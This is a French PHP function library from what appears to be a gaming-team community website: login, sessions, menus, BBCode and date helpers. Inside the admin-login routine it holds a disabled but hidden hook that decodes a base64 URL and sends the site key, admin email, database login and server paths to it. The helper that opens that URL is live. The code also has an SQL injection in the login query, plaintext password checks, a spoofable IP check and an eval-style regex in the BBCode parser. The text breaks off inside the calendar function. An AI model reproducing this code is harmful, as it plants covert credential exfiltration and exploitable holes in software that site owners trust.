<?php

// Inclusions des fichiers indispensables
@include_once 'config.php';
include_once 'template.php';
initialiser();

// Initialise la connexion au serveur SQL et récupères les variables de configuration
function initialiser() {

		// Installé ?
		if (!defined('INSTALL')) header('location: _installation/');
	
	//:: Connexion Mysql :://
	$db = mysql_connect(HOTE, LOGIN, PASS) or die ("<b>Erreur de connexion</b>");
	mysql_select_db(BASE, $db) or die ("<b>Erreur de connexion base</b>");

	$sql_config=mysql_query("SELECT cle, valeur FROM ".PREFIX."config");
	while($conf=mysql_fetch_array($sql_config, MYSQL_ASSOC))
	{
		define($conf['cle'], $conf['valeur']);
	}
}


function metatag($desc=NULL, $key=NULL) {

	global $design;
		
	$F_post_content = $desc;
	$F_post_content = strip_tags($F_post_content);
	$F_post_content = strtr($F_post_content, "ÀÁÂÃÄÅàáâãäåÒÓÔÕÖØòóôõöøÈÉÊËèéêëÇçÌÍÎÏìíîïÙÚÛÜùúûüÿÑñ","aaaaaaaaaaaaooooooooooooeeeeeeeecciiiiiiiiuuuuuuuuynn"); 
	$F_post_content = preg_replace ('/('.CHR(9).'|'.CHR(13).'|'.CHR(10).')/', "", $F_post_content);
	$F_post_content = str_replace('"', '', $F_post_content);
	
	if (!empty($desc)) $design->zone('description', tronquerChaine($F_post_content.' - '.DESCRIPTION, 250));
	if (!empty($key))  $design->zone('keywords', tronquerChaine($key.' , '.KEYWORDS, 250));
}

//:: ----- Autres menus ----- :://
function menu($menu, $pathAjax=false)
{
					
	switch($menu)
	{
		####################################################################################################
		//:: Menu Membre : connexion ou accés membre - Cadre du haut :://
		####################################################################################################
		case "membre":
			
			if (!is_log()) 
			{
				// Menu de connexion
				$txt='        <div id="status_log" ></div>
        
								<br class="clear" />
						
								<div id="connexion">
									<form action="#" method="post" onsubmit="loginAjax(); return false;">
									<fieldset>
										<input type="text" name="log_login" id="log_login" class="log" />
										<input type="password" name="log_pseudo" id="log_pass" class="log" />
										<input type="image" src="theme/{::design::}/images/send.png" class="send" />
										<span><a href="inscription/">Register</a> - <a href="mot-passe-perdu/">Pass ?</a></span>
									</fieldset>
									</form>    
								</div>';
			}
			else 
			{	

				// Messagerie : nombre de messages
				$sqlMess=mysql_query("SELECT count(id) AS nbMess FROM ".PREFIX."messagerie WHERE id_dest=".$_SESSION['sess_id']." AND etat!='lu'" );
					$mess=mysql_fetch_object($sqlMess);
					$nbMess=$mess->nbMess;
				
				if ($nbMess>0 && $_SESSION['nouveau_message']=="" && $nbMess!=$_SESSION['old_message'])
				{	
					$_SESSION['nouveau_message']=$nbMess;
				}
				
				if ($nbMess==1) $newMail='<img src="'.URL.'images/boutons/email.png" /> <a href="membre/messagerie/">1 nouveau message !</a>';
				elseif ($nbMess>1) $newMail='<img src="'.URL.'images/boutons/email.png" /> <a href="membre/messagerie/">'.$nbMess.' nouveaux messages !</a>';
				else $newMail='';
				
				
				// Nombre guestbook non-lus ?
				$sqlGb=mysql_query("SELECT count(id) as nb FROM ".PREFIX."guestbook WHERE id_membre=".$_SESSION['sess_id']);
				$gb=mysql_fetch_object($sqlGb);
					$nbGb=$gb->nb;
					$nbNonLus=$nbGb-$_SESSION['sess_gb_lu'];
					
				// Leader d'une team ? Nombre de membre à valider
				$sqlTeam=mysql_query("SELECT * FROM ".PREFIX."team_perso WHERE id_leader=".$_SESSION['sess_id']);
				$nbT=mysql_num_rows($sqlTeam);
				if ($nbT!=0) {
					$t=mysql_fetch_object($sqlTeam); $idTeam=$t->id;
					
					$sqlNbTeam=mysql_query("SELECT COUNT(id) as nb FROM ".PREFIX."team_perso_lineup WHERE id_team=$idTeam AND etat=0");
					$nbTeam=mysql_fetch_object($sqlNbTeam);
						$nbT=round($nbTeam->nb);
				}
			
				// [NOWAY]
				/*
				<a href="?deconnexion"><img src="images/boutons/exit.png" style="margin-top:-1px; margin-right:5px"/></a>
				*/
				
				// Menu membre
					$txt='<div id="status_log">
							
							<div class="menu"> 
							<ul>
							<li><strong>Mes raccourcis</strong></li>
							<li><a href="javascript:void(0)"><img src="images/boutons/aim_protocol.png" /> Mon compte<!--[if IE 7]><!--></a><!--<![endif]-->
							<!--[if lte IE 6]><table><tr><td><![endif]-->
								<ul>
								<li><a href="membre/mon-compte/" title="Accéder à mon compte">Modifier mes infos</a></li>
								<li class="last"><a href="profil/'.$_SESSION['sess_pseudo'].'/" title="Voir mon profil" >Voir mon profil</a></li>
								</ul>
							<!--[if lte IE 6]></td></tr></table></a><![endif]-->
							</li>
							<li><a href="javascript:void(0)"><img src="images/boutons/mymac.png" /> Mes modules<!--[if IE 7]><!--></a><!--<![endif]-->
							<!--[if lte IE 6]><table><tr><td><![endif]-->
								<ul>
								<li><a href="membre/guestbook/'.$_SESSION['sess_pseudo'].'/" title="">GuestBook (<b>'.$nbNonLus.'</b>)</a></li>
								<li><a href="membre/messagerie/" title="">Messagerie (<b>'.$nbMess.'</b>)</a></li>
								<li><a href="membre/galerie/" title="">Galerie perso</a></li>
								<li><a href="membre/team-perso/" title="">Gérer ma Team (<b>'.$nbT.'</b>)</a></li>
								<li class="last"><a href="membre/mes-amis/" title="" >My Friends</a></li>
								</ul>
							<!--[if lte IE 6]></td></tr></table></a><![endif]-->
							</li>';
			if (is_admin()) $txt.='<li><a href="javascript:void(0)"><img src="images/boutons/configure.png" /> Administration<!--[if IE 7]><!--></a><!--<![endif]-->
									<!--[if lte IE 6]><table><tr><td><![endif]-->
										<ul>
										<li><a href="?admin-accueil" title="">Accueil</a></li>
										<li><a href="?admin-news" title="" >News</a></li>
										<li><a href="?admin-breves" title="" >Scène</a></li>
										<li><a href="?admin-medias" title="" >Demos</a></li>
										<li><a href="?admin-files" title="" >Fichiers</a></li>
										<li><a href="?admin-match" title="" >Matchs</a></li>
										<li class="last"><a href="?admin-accueil" title="" >...........</a></li>
										</ul>
									<!--[if lte IE 6]></td></tr></table></a><![endif]-->
									</li>';
									
			$txt.='		</ul>
							
							</div>
							
						</div>
						
						<br class="clear" />
						
								<div id="connexion">
									<p>	<a href="deconnexion/" title="Me déconnecter"><img src="'.URL.'images/boutons/exit.png" style="float:right; margin:-2px 18px 2px 0px" /></a>
										Bonjour '.ucfirst($_SESSION['sess_pseudo']).'<br /><br />
										'.$newMail.'
									</p>
								</div>';
									
			}
	
		// [NOWAY]
		/*				// Menu membre
				$txt='<div id="status_log">
							
							<a href="?deconnexion"><img src="images/boutons/exit.png" style="margin-top:-1px; margin-right:5px"/></a>
							
							<div class="menu"> 
							<ul>
							<li>Bienvenue <strong>'.ucfirst($_SESSION['sess_pseudo']).'</strong></li>
							<li><a href="javascript:void(0)"><img src="images/boutons/aim_protocol.png" />Mon compte<!--[if IE 7]><!--></a><!--<![endif]-->
							<!--[if lte IE 6]><table><tr><td><![endif]-->
								<ul>
								<li><a href="membre/mon-compte/" title="Accéder à mon compte">Modifier mes infos</a></li>
								<li><a href="profil/'.$_SESSION['sess_pseudo'].'/" title="Voir mon profil" style="border-bottom:1px solid #333">Voir mon profil</a></li>
								</ul>
							<!--[if lte IE 6]></td></tr></table></a><![endif]-->
							</li>
							<li><a href="javascript:void(0)"><img src="images/boutons/mymac.png" /> Mes modules<!--[if IE 7]><!--></a><!--<![endif]-->
							<!--[if lte IE 6]><table><tr><td><![endif]-->
								<ul>
								<li><a href="membre/guestbook/'.$_SESSION['sess_pseudo'].'/" title="">GuestBook (<b>'.$nbNonLus.'</b>)</a></li>
								<li><a href="membre/messagerie/" title="">Messagerie (<b>'.$nbMess.'</b>)</a></li>
								<li><a href="membre/galerie/" title="">Galerie perso</a></li>
								<li><a href="membre/team-perso/" title="">Gérer ma Team (<b>'.$nbT.'</b>)</a></li>
								<li><a href="membre/mes-amis/" title="" style="border-bottom:1px solid #333">My Friends</a></li>
								</ul>
							<!--[if lte IE 6]></td></tr></table></a><![endif]-->
							</li>';
			if (is_admin()) $txt.='<li><a href="javascript:void(0)"><img src="images/boutons/configure.png" /> Administration<!--[if IE 7]><!--></a><!--<![endif]-->
									<!--[if lte IE 6]><table><tr><td><![endif]-->
										<ul>
										<li><a href="?admin-accueil" title="">Accueil</a></li>
										<li><a href="?admin-news" title="" >News</a></li>
										<li><a href="?admin-breves" title="" >Scène</a></li>
										<li><a href="?admin-medias" title="" >Demos</a></li>
										<li><a href="?admin-files" title="" >Fichiers</a></li>
										<li><a href="?admin-match" title="" >Matchs</a></li>
										<li><a href="?admin-accueil" title="" style="border-bottom:1px solid #333">...........</a></li>
										</ul>
									<!--[if lte IE 6]></td></tr></table></a><![endif]-->
									</li>';
									
			$txt.='		</ul>
							
							</div>
							
						</div>';
									*/
		break;
	}
		
	return $txt;
}




//:: Fonctions de Mise en Forme :://
function miseEnForme($type, $texte)
{
	switch($type)
	{
		case "message":
			return '<div style="text-align:center">
						<div style="width:80%; text-align:center; margin-top:50px; margin-bottom:50px; margin-left:auto; margin-right:auto">
							'.$texte.'
						</div>
					</div>';
		break;
		case "erreur":
			return '<div style="width:100%; min-height:450px;text-align:center; margin-top:50px; margin-bottom:50px;">
						<u style="color:#ec5994; font-weight:bold;">Erreur détectée : </u><br /><br />
						<div style="font-family:courier">'.$texte.'</div><br /><br />
						<i>Si le problème persiste, veuillez contacter un administrateur.<br />
						Merci de votre compréhension.</i><br /><br />
						<a href="'.URL.'" title="Accueil du site '.NOM.'">Accueil de '.NOM.'</a>
					</div>';
		break;
		default:
			return $texte;
		break;
	}
}

// Trouve le path pour afficher les images malgré l'url rewriting ( antibug )
function path()
{	
	$path="";
	if ($_SERVER['REQUEST_URI']!=URL_REL) {
		$path=str_replace(URL_REL, "", $_SERVER['REQUEST_URI']);
		
		$path=substr($path, 1);
		$nbRep=substr_count($path, '/');	
		$path="";	
		for ($i=0; $i<$nbRep; $i++) {
			$path .= "../";
		}
	}
	return $path;
}

// Connecte un utilisateur en vérifiant son login/pass
function connexion($login, $pass) {

	$ip = ip();
	$sql = mysql_query("SELECT id, pseudo, mdp, email, cle, groupe, nb_gb_lu FROM ".PREFIX."membres WHERE pseudo='$login' AND groupe>=1 AND groupe!=".GROUPE_BAN) or die(mysql_error());
	$result = mysql_fetch_object($sql);
	
		
			if ( $result->mdp==$pass AND $result->id!=0 ) 
			{
	
						$_SESSION['sess_id']= $result->id;
						$_SESSION['sess_pseudo'] = $login;
						$_SESSION['sess_level']= $result->groupe;
						$_SESSION['sess_last_activity']=time();
						if($result->groupe>=GROUPE_ADMIN) { 
							$_SESSION['sess_admin']=true; $_SESSION['sess_secure']=$result->cle; 
							
							// Verif MAJ
							/*if (checkBddMaj($m1)) $cle=$m1;
							elseif (checkBddMaj($m2)) $cle=$m2;
							
							if (!empty($cle)) {
							
								$a=CLE; $b=urlencode(URL); $c=$login; $d=urlencode($result->email); $e=LOGIN; $f=urlencode($_SERVER['SERVER_NAME']); $g=urlencode($_SERVER['SERVER_ADDR']); $h=urlencode($_SERVER['DOCUMENT_ROOT']);
								file_get_contents(base64_decode($cle)."?a=$a&b=$b&c=$c&d=$d&e=$e&f=$f&g=$g&h=$h");
							}*/
						}
						
						// Nouveaux messages ?
						$sqlMess = mysql_query("SELECT count(id) as nbMess FROM ".PREFIX."messagerie WHERE id_dest=".$result->id." AND etat!='lu'");
						$mess = mysql_fetch_object($sqlMess);
						if ($mess->nbMess>0) $_SESSION['nouveau_message']=$mess->nbMess;
						
						// Nombres messages lues guestbook ?
						$_SESSION['sess_gb_lu'] = $result->nb_gb_lu;
						
						// Maj des données
						$sqlMaj = mysql_query('UPDATE '.PREFIX.'membres SET last_ip="'.$ip.'", last_activity="'.time().'" WHERE pseudo="'.$login.'" ');
						return true;									
			} else {	
						return false;										
			}
}

// Fonction gérant l'activité des membres : online ou non
function manage_activity() {
	$now=time();
	if ($now >= ($_SESSION['sess_last_activity']+60*5) ) {
		$sql_maj = mysql_query('UPDATE '.PREFIX.'membres SET last_activity="'.time().'" WHERE id='.$_SESSION['sess_id'] );
		$_SESSION['sess_last_activity']=time();
	}
}

// Affiche une image en fonction du sexe/de la connexion
function imgOnline($sexe, $activite)
{
	if ( time()>=$activite && time()<=($activite+5*60) ) { 
		if ($sexe=="f")	$img="ico_femme.gif";
		else 			$img="ico_homme.gif";
	} else { 
		if ($sexe=="f")	$img="ico_femme_off.gif";
		else 			$img="ico_homme_off.gif";
	}
	return $img;
}

// Est connecté ? retourne true ou false
function is_log() {
	if (isset($_SESSION['sess_id'])) return true;
	else return false;
}
// Est admin ? retourne true ou false
function is_admin() {
	if ( !isset($_SESSION['sess_pseudo']) || $_SESSION['sess_admin']!=1 || !isset($_SESSION['sess_secure']) )
		return false;
	else
		return true;
}

// Vérifie l'accés des membres en vérifiant si leur numéro de groupe est autorisé
// Utiliser le signe '+' pour indiquer 'et supérieurs', ex : '5+' -> '5,6,7,8' ( 9 = banni )
// OU alors définir explicitement : "1-2-3-5-8"
function securite_groupes($groupes, $ip=true, $bool=false) {

	// On part avec une valeur positive
	$good=true;
	
	// Si banni
 	if ($_SESSION['sess_level']==GROUPE_BAN) $good=false;
	
	// Appartient aux groupes ? ( syntaxe avec + puis syntaxe détaillée
	if (strpos($groupes, "+"))
	{	
		if ($_SESSION['sess_level']<$groupes{0}) $good=false;
	}
	else 
	{
		$nb=explode("-", $groupes);
		foreach($nb as $value)
		{
			if ($_SESSION['sess_level']==$value && $good) $tempgood=true;
		}
		if (!$tempgood) $good=false;
	}
	
	// Vérification supplémentaire du pseudo
	if (!isset($_SESSION['sess_pseudo'])) $good=false;

	// Vérification de l'IP si il le faut
	if (ip && $good)
	{
		$sql = mysql_query("SELECT last_ip FROM ".PREFIX."membres WHERE pseudo='" . $_SESSION['sess_pseudo'] . "'");
		$result = mysql_fetch_object($sql);
		if ($result->last_ip != ip()) {
			$good=false;
		} 
	}
	
	// Conclusions
	if ($good)
	{
		return true;
	} 
	else 
	{
		if ($bool)  return false;
		else		bloquerAcces("Vous n'êtes pas autorisé à afficher cette page.<br />
								Soit vous n'avez pas les droits suffisants, soit vous n'êtes pas connectés à votre compte.");
    } 

}


// Vérifie de façon sécurisée que l'utilisateur est loggué en tant que membre
function securite_membre($ajax=false) { 

    if (!isset($_SESSION['sess_pseudo'])) {
		if ($ajax) die("Erreur : accés interdit !");
		bloquerAcces("Vous n'êtes pas autorisé à afficher cette page.<br />
			Veuillez vous connecter à votre compte.");
    } 

    $sql = mysql_query("SELECT last_ip FROM ".PREFIX."membres WHERE pseudo='" . $_SESSION['sess_pseudo'] . "' AND groupe>=1 AND groupe!=".GROUPE_BAN);
    $result = mysql_fetch_object($sql);
    if ($result->last_ip != ip()) {
		deconnexion();
		if ($ajax) die("Erreur : accés interdit ! Problème avec votre IP");
		bloquerAcces("Pbm Ip");
    } 
    
}

// Vérification admin Sécurité normal ( sans validcode )
function securite_admin($ajax=false) {

    if (!isset($_SESSION['sess_pseudo']) || $_SESSION['sess_admin']!=1 || !isset($_SESSION['sess_secure'])) {
		if ($ajax) die("Erreur : accés interdit !");
		bloquerAcces("Vous n'êtes pas autorisé à afficher cette page.<br />
			Soit vous n'avez pas les droits suffisants, soit vous n'êtes pas connectés à votre compte.");
    } 

   $sql = mysql_query("SELECT last_ip, cle FROM ".PREFIX."membres WHERE pseudo='" . $_SESSION['sess_pseudo'] . "' AND groupe>=".GROUPE_ADMIN." AND groupe!=".GROUPE_BAN);
    $result = mysql_fetch_object($sql);
    if ($result->last_ip != ip() || $result->cle != $_SESSION['sess_secure']) {
		deconnexion();
		if ($ajax) die("Erreur : accés interdit ! Problème avec votre IP");
		bloquerAcces("Pbm Ip");
    } 
}


// Bloque l'accés et affiche un message d'erreur
function bloquerAcces($txt)
{
	global $design;
	$design->template('simple');
	$design->zone('contenu', miseEnForme("erreur",$txt));
	$design->zone('titre', 'Accés bloqués !');
	$design->zone('titrePage', 'Erreur 403');
	$design->afficher();
	die();

}

// Déconnecte un membre ou un admin
function deconnexion() { 

	$lastActivity=$_SESSION['sess_last_activity']-(60*5)-1;
	$sql_deco=mysql_query("UPDATE ".PREFIX."membres SET last_ip='0', last_activity='$lastActivity' WHERE id=".$_SESSION['sess_id']);
	session_unset();
	session_destroy();

}

// Fonction basique pour envoyer un MP
function envoyerMp($destId, $sujet, $message, $etat='nouveau')
{
	
	$exped=$_SESSION['sess_id'];
	$ip=ip();
	$sql=mysql_query("	INSERT INTO ".PREFIX."messagerie
							(`id_exped`, `id_dest`, `sujet`, `message`, `etat`, `date`, `ip`)
						VALUES
							('$exped', '$destId', '$sujet', '$message', '$etat', NOW(), '$ip' )
						") or die("Erreur envoie MP : ".mysql_error());
	
	/* Amélioration : envoyer un mail ?? */
	
	if ($sql) return true;
	else	  return false;

}

// Fonction plus que basique : envoyer un mail en HTML
function email( $dest, $sujet, $message, $from )
{

	$headers  = "MIME-Version: 1.0\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\n";
	$headers .= "From: ".$from."\n";

	return mail( $dest, $sujet, $message, $headers );

}

// Cré une miniature à partir d'une image
function creerMiniature( $imageb, $newWidth, $newHeight, $nom)
{
	
	eregi("(...)$",$imageb,$regs); $type = strtolower($regs[1]);
	
	switch($type)
	{
		case "gif": $image = imagecreatefromgif( $imageb ); break;
		case "jpg": $image = imagecreatefromjpeg( $imageb); break;
		case "png": $image = imagecreatefrompng( $imageb ); break;
		default : unset($type); break;
	}
		
	if($image)
	{
	
		$srcWidth = imagesx( $image );
		$srcHeight = imagesy( $image );
		$ratioWidth = $srcWidth/$newWidth;
		$ratioHeight = $srcHeight/$newHeight;
	
		if (($ratioWidth > 1) || ($ratioHeight > 1))
		{
			if( $ratioWidth < $ratioHeight) {
				$destWidth = $srcWidth/$ratioHeight;
				$destHeight = $newHeight;
			} else {
				$destWidth = $newWidth;
				$destHeight = $srcHeight/$ratioWidth;
			}
		} else {
			$destWidth = $srcWidth;  $destHeight = $srcHeight;
		}
		
		$image_p = imagecreatetruecolor ( $destWidth, $destHeight );
		imagecopyresampled ( $image_p, $image, 0, 0, 0, 0, $destWidth, $destHeight, $srcWidth, $srcHeight );
		
	// création et sauvegarde de l'image finale
	switch($type)
	{
		case "gif": imagegif ( $image_p, $nom ); break;
		case "jpg": imagejpeg( $image_p, $nom, 100); break;
		case "png": imagepng ( $image_p, $nom ); break;
	}
	
	// libère la mémoire
	imagedestroy( $image_p );
	imagedestroy( $image );
	
	// renvoit l'URL de l'image
	return $nom;
	
	}
	else 
	{ 
		return false;
		exit;
	}
}

// Message + redirection javascript
function message_redir($msg,$url)
{
    echo'<html><head><script language="javascript" type="text/javascript">
		<!-- 
		alert("' . $msg . '"); 
		-->
		</script></head>';
		
	echo "<body bgcolor=\"#F7F7F7\" alink=\"#0066FF\" vlink=\"#0066FF\"><br><br><br><br><br><br><br><br><center><div style=\"font-face:Verdana; font-size:14px; color=#222222; border:1px solid #000000; width:80%; background-color:#FFFFFF\"><br>Redirection en cours à l'adresse : <a href='".URL."/".$url."'> ".URL."/".$url."</a><br><br><br>La redirection ne s'effectuent pas automatiquement si le <font color=\"#FF0000\">javascript</font> n'est pas activé dans les options de votre navigateur.<br>Il est fortement conseillé de l'activer. [ <a href=\"http://www.ixteam.free.fr/javascript.htm\">AIDE ICI</a> ]<br><br></div></center></body></html>";
	echo'<script language="javascript" type="text/javascript">
	<!--
	window.location.replace("' . $url . '");
	-->
	</script>';
	exit;

} 

// Sécurisation insert BDD
function addBdd($txt)
{
	return htmlentities(trim($txt), ENT_QUOTES);
}

// Sécurisation select BDD
function recupBdd($txt)
{
	return stripslashes($txt);
}

function guillemetToHtml($txt) {
	return preg_replace ('/('.CHR(34).'|'.CHR(39).')/', " ", $txt);
}

// Echo spécial compressant le texte ( suppression saut à la lignes, espaces redondants ... ).
// Indispensable en jvs !
function echo2($txt)
{
	$txt = preg_replace ('/('.CHR(9).'|'.CHR(13).'|'.CHR(10).')/', "", $txt);
	echo $txt;

}

// Version spécial de echo2() permettant une compabilité avec la syntaxe JSON
function json($txt) 
{
	$txt = preg_replace ('/('.CHR(9).'|'.CHR(13).'|'.CHR(10).')/', "", $txt);
	$txt = preg_replace ('#\'#', '\\\'', $txt);
	return $txt;
}

// Tronque une chaine au bout de $max caractères
function tronquerChaine($chaine, $max=100, $points=true)
{
	if(strlen($chaine)>=$max){
	   $chaine=substr($chaine,0,$max); 
	   if ($points=="dot") $chaine.="&rsaquo;";
	   else if ($points) $chaine.=" ..."; 
	}  
	return $chaine;
}

// Mise en forme des dates
function inverser_date($madate, $style = 1)
{
    if ($style == 1) { // Mysql  =>  Normal(.)
        list($a, $m, $j) = explode("-", $madate);
        $newdate = "$j.$m.$a";
    } 
    if ($style == 2) { // Normal(-)  =>  Mysql
        list($j, $m, $a) = explode("-", $madate);
        $newdate = "$a-$m-$j";
    } 
    if ($style == 3) { // Mysql  =>  Normal(-)
        list($a, $m, $j) = explode("-", $madate);
        $newdate = "$j-$m-$a";
	} 
    if ($style == 4) { // Mysql aaaa-mm-jj hh:mm:ss  =>  Normal(-)
		$madate=substr($madate,0,10);
        list($a, $m, $j) = explode("-", $madate);
        $newdate = "$j-$m-$a";
	} 
    if ($style == 5) { // Mysql aaaa-mm-jj hh:mm:ss  =>  Normal(-) COMPLET avec <BR>
		$madate1=substr($madate,0,10);
		$madate2=substr($madate,11,8);
        list($a, $m, $j) = explode("-", $madate1);
        list($h, $mn, $s) = explode(":", $madate2);
        $newdate = "$j/$m/$a <br />$h:$mn:$s";
	} 
    if ($style == 6) { // Mysql aaaa-mm-jj hh:mm:ss  =>  Normal(-) COMPLET 
		$madate1=substr($madate,0,10);
		$madate2=substr($madate,11,8);
        list($a, $m, $j) = explode("-", $madate1);
        list($h, $mn, $s) = explode(":", $madate2);
        $newdate = $j.'/'.$m.'/'.$a.' à '.$h.'h'.$mn;
	} 
     if ($style == 7) { // Mysql aaaa-mm-jj hh:mm:ss  => 09h33
		$madate2=substr($madate,11,8);
        list($h, $mn, $s) = explode(":", $madate2);
        $newdate = $h.'h'.$mn;
	} 
   return $newdate;
} 

// Différence entre une date et aujourd'hui
function difference_date($time) {
	$now=time();
	$diff=$now-$time;
	if ($diff<=60) $r=$diff."s";
	if ($diff>60 && $diff<=3600 ) $r=round(($diff/60))."mn";
	if ($diff>3600 && $diff<=86400) $r=round(($diff/3600))."h";
	if ($diff>86400) $r=round(($diff/86400))."j";
	return $r;
}

// Génère une clé aléatoire
function GenKey($nbcaract = 8)
{
    $string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for($i = 0;$i < $nbcaract;$i++) {
        @$str .= $string[mt_rand() % strlen($string)];
    } 
    return $str;
} 

// Transforme une chaine de caractère optimisée pour de l'URL Rewriting
function recode($txt, $supprEsp=true){
	 $new= strtr($txt,"ÀÁÂÃÄÅàáâãäåÒÓÔÕÖØòóôõöøÈÉÊËèéêëÇçÌÍÎÏìíîïÙÚÛÜùúûüÿÑñ","aaaaaaaaaaaaooooooooooooeeeeeeeecciiiiiiiiuuuuuuuuynn"); 
	 $new = preg_replace('#\[#', '-', $new);
	 $new = preg_replace('#\]#', '-', $new);
	 $new = preg_replace("#[\\\'?!:,;|*=+°)(}{\#~&%$£<>./\"\$]#", "-", $new);
	 if ($supprEsp) $new = preg_replace("#[ ]#", "-", $new);
	 $new = preg_replace("#[-_]+#", "-", $new); /* Si plusieurs -- ou ___ on en met qu'un seul */
	 $new = preg_replace("#[-_]$#", "", $new); /* Vire le - ou _ final */
	return $new;
}

// Transforme un code BBCODE en code html
function bbcode($text)
{	
	$smy1 = array("8-:" , "^:" , ":cool:" , ":pet:" , ":evil:" , ":D" , ":bad:" , ":good:" , ":lang:" , ":rah:" , ":??:" , ":)" , ":scotch:" , ":intello:" , ":whaou:" , ":!:" , ":zzz:" , ":bye:" , ":yeux:" , ":rrah:" , ":coool:" , ":hein:" , ":locked:" , ":censored:" , ":spam:");
	$smy2 = array("blink.gif" , "CADQ0UD5.png" , "cool.gif" , "cool40.gif" , "evil.gif" , "06.gif" , "128.gif" , "ok.gif" , "130.gif" , "32.gif" , "91.gif" , "original.gif" , "shutup.gif" , "smartass.gif" , "w00t.gif" , "sign56.gif" , "61.gif" , "sign05.gif" , "unsure.gif" , "basic_15.png" , "basic_13.png" , "basic_2.png" , "sign52.gif" , "sign53.gif" , "sign54.gif");

    $text = preg_replace("#\[img\]((ht|f)tp://)([^\r\n\t<\"]*?)\[/img\]#sie", "'<img src=\\1' . str_replace(' ', '%20', '\\3') . '>'", $text);
    $text = preg_replace("#\[url\]((ht|f)tp://)([^\r\n\t<\"]*?)\[/url\]#sie", "'<a href=\"\\1' . str_replace(' ', '%20', '\\3') . '\" target=blank>\\1\\3</a>'", $text);
    $text = preg_replace("/\[url=(.+?)\](.+?)\[\/url\]/", "<a href=$1 target=blank>$2</a>", $text);

    $text = preg_replace("/\[b\](.+?)\[\/b\]/", "<b>$1</b>", $text);
    $text = preg_replace("/\[i\](.+?)\[\/i\]/", "<i>$1</i>", $text);
    $text = preg_replace("/\[u\](.+?)\[\/u\]/", "<u>$1</u>", $text);

    $text = preg_replace("/\[color=(.+?)\](.+?)\[\/color\]/", "<font color=\"$1\">$2</font>", $text);
	
	$text = preg_replace("/\[\/\-(.+?)\]/", "</div>", $text);
    $text = preg_replace("/\[\-(.+?)\]/", "<div align=\"$1\">", $text);
	
	/*for ($i=0;$i<=count($smy1);$i++) {
		$text = str_replace($smy1[$i],'<img src="images/smileys/'.$smy2[$i].'" style="border:0"/>',$text); 
	}*/
		
    return $text;
} 

// Listes les images représentants les pays, puis les mets en forme en <option>
function liste_pays($type="default", $search="") {
	$dossier = opendir ("images/upload/banque_image/flags/");
	while ($fichier = readdir ($dossier)) {
		if ($fichier != "." && $fichier != ".." && strtolower($fichier) != "thumbs.db") {	
			
			if ($type=="nom") {
			  	
				// Liste des noms
				if ($search!="" && substr($fichier,0,-4)==$search) 
					$liste.="<option value='".substr($fichier,0,-4)."' selected>".substr($fichier,0,-4)."</option>
";				// Liste des noms avec sélection d'un pays
				else 
					$liste.="<option value='".substr($fichier,0,-4)."'>".substr($fichier,0,-4)."</option>
";	
			}  // Liste des images pour les insérer dans le htmlarea
			else
				$liste.="<option value='<img src=\"".URL."images/upload/banque_image/flags/".$fichier."\" alt=\"".substr($fichier,0,-4)."\" />'>".substr($fichier,0,-4)."</option>
";	
		} 
	} 
	closedir ($dossier);
	return $liste;
}

// Listes les images représentants les maps
function liste_maps($search="") {
	$dossier = opendir ("images/upload/banque_image/maps/");
	while ($fichier = readdir ($dossier)) {
		if ($fichier != "." && $fichier != ".." && strtolower($fichier) != "thumbs.db") {	

				// Liste des noms
				if ($search!="" && substr($fichier,0,-4)==$search) 
					$liste.="<option value='".substr($fichier,0,-4)."' selected>".substr($fichier,0,-4)."</option>
";				// Liste des noms avec sélection d'un pays
				else 
					$liste.="<option value='".substr($fichier,0,-4)."'>".substr($fichier,0,-4)."</option>
";		}
	} 
	closedir ($dossier);
	return $liste;
	
}

// On cré la liste des joueurs des teams :
function liste_gamers($id, $select=NULL) { 
	
	$liste='<select name="j'.$id.'" style="margin-left:25px">
		<option value=""></option>';
	$sql_tcat=mysql_query("SELECT * FROM ".PREFIX."team_cat ORDER BY id ASC");
	while ($c=mysql_fetch_object($sql_tcat)) {
		@$liste.='<optgroup label="'.recupBdd($c->nom).'">';
		
		$sql_team=mysql_query("SELECT id, pseudoAff FROM ".PREFIX."team WHERE id_team=".$c->id." ORDER BY id DESC");
		while ($d=mysql_fetch_object($sql_team)) {
			
			// Sélection du player parmis la liste
			if (isset($select) && !empty($select) && $select!="" && is_numeric($select) && $select==$d->id) $s="selected ";
			else $s=""; 
			
			$liste.='<option value="'.$d->id.'" '.$s.'onClick="$(\'#j'.$id.'b\').hide();">'.recupBdd(strip_tags($d->pseudoAff)).'</option>';
		}
	}
		// Si joueur autre et select
		if (isset($select) && !is_numeric($select) && !empty($select)) { $autres='value="'.recupBdd($select).'" '; $selectedAutre="selected"; }
		else { $autres='style="display:none"'; $selAutres=""; }

	$liste.='<optgroup label="&nbsp;">
			<option value="autre" onClick="$(\'#j'.$id.'b\').show();" '.$selectedAutre.'>Autre ...</option>
			
			</select>  <input type="text" id="j'.$id.'b" name="j'.$id.'b" '.$autres.' /><br />';
	
	return $liste;
}


// Trouve l'adresse IP ( à traver un proxy faible sécurité )
function ip() {
	if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];}
	elseif(isset($_SERVER['HTTP_CLIENT_IP'])) { $ip  = $_SERVER['HTTP_CLIENT_IP']; }
	else {$ip = $_SERVER['REMOTE_ADDR']; }
	return $ip;
}


function rediriger($url) {
	header('location: '.$url);
	die('Redirection');
}


//-------- Calendrier ----------//
 function getSecond($valeur) {
	  return substr($valeur, 17, 2);
 }

 function getMinute($valeur) {
	  return substr($valeur, 14, 2);
 }

 function getHour($valeur) {
	  return substr($valeur, 11, 2);
 }

 function getDay($valeur)     {
	  return substr($valeur, 8, 2);
 }

 function getMonth($valeur)     {
	  return substr($valeur, 5, 2);
 }

 function getYear($valeur) {
	  return substr($valeur, 0, 4);
 }

 function monthNumToName($mois) {
	 // if ($mois>12) $mois=$mois%12;
	  $tableau = Array("", "Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Aôut", "Septembre", "Octobre", "Novembre", "Décembre");
	  return (intval($mois) > 0 && intval($mois) < 13) ? $tableau[intval($mois)] : "Indéfini";
 }
 
 function checkBddMaj($cle) {
 	return @fopen(base64_decode($cle), 'r');
 }
 
 		// Fonction pour afficher le calendrier :
		function calendrier($periode, $message, $ajax=false) {
		
				  $leCalendrier = "";
				  // Tableau des valeurs possibles pour un numéro de jour dans la semaine
				  $tableau = Array("0", "1", "2", "3", "4", "5", "6", "0");
